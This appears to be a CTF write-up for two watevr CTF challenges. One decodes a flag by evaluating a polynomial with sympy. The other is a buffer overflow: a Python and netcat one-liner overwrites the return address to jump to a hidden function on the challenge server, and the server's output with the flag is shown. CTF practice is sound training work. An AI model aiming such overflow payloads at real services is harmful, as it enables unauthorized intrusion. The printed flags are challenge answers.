Hey guys back with another set of few writeups

# **MISC**

## Polly-:
> description:

I sure do love my polly uh ehh i mean polynomials, heh. Yeah that's what I meant...

### Solution: 

We were given [polly.txt](scripts/polly.txt) file which contains the polynomial
and following observations I conlcuded from them:

1. Why there are mostly zeroes at the end of denominator in each coefficient
2. Then 119 is the ascii of 'w'.

then looking for more in direction of approach 2nd I thought, that 119 is the value of polynomial at value '0'.
So maybe 'a' will be the value of polynomial at x='1' as we know the flag format 'watevr{'.

Thus [scripting](scripts/poly.py) it in few lines using [sympy](https://www.sympy.org/).

```python

from sympy import *
y=eval(open("polly.txt","r").read())
x=symbols('x')
print(''.join([chr(y.subs(x,i)) for i in range(57)]))
```

Here is our flag:
>   watevr{polly_polynomials_youtube.com/watch?v=THNWVVn9JO0}

# **PWN**

##  Voting Machine 1-:
> description:

In a world with many uncertainties we need some kind of structure. Democracy is a big part of that, therefore we need voting machines! Well, at least if they are safe...

### Solution: 

We were given 64 bit binary [kamikaze](scripts/kamikaze)

>kamikaze: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=0e647f48bd36f15e866166910d10dd173fb0fcf6, not stripped

Upon finding functions `0x0000000000400807  super_secret_function` found this but main function wasn't redirecting it.
So basic buffer overflow challenge and set the return pointer to this function and then execute it .

So one liner linux command for that:

`(python -c 'from pwn import p64;print "A"*10 +p64(0x00400807)') | nc 13.48.67.196 50000`


```
Hello and welcome to our voting application!
Today's vote will be regarding the administration of
watevr CTF.
the voting range is 0 to 10. 0 being the worst possible and 10 being the best possible.
Thanks!
Vote: Thanks for voting!
watevr{w3ll_th4t_w4s_pr3tty_tr1v1al_anyways_https://www.youtube.com/watch?v=Va4aF6rRdqU}
```


Here is our flag 

>   watevr{w3ll_th4t_w4s_pr3tty_tr1v1al_anyways_https://www.youtube.com/watch?v=Va4aF6rRdqU}


